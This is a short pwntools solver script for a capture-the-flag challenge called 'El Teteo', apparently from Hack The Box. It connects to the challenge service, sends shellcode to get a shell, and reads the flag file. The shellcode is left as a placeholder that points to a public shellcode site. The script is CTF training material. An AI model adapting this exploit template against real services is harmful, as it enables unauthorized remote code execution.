# Copied from the challenge "El Teteo"

#!/usr/bin/python3
from pwn import *
import warnings
import os
warnings.filterwarnings('ignore')
context.arch = 'amd64'

fname = './el_teteo' 

LOCAL = False # CHANGE THIS TO True if you want to run it locally

os.system('clear')

if LOCAL:
  print('Running solver locally..\n')
  r    = process(fname)
else:
  IP   = str(sys.argv[1]) if len(sys.argv) >= 2 else '0.0.0.0'
  PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 1337
  r    = remote(IP, PORT)
  print(f'Running solver remotely at {IP} {PORT}\n')

# Shellcode from https://shell-storm.org/shellcode/files/shellcode-806.html
sc = "add payload here" # ADD THE CORRECT PAYLOAD HERE

# Send shellcode
r.sendlineafter('>', sc)

# Get flag
pause(1)
r.sendline('cat flag*')
print(f'Flag --> {r.recvline_contains(b"HTB").strip().decode()}\n')
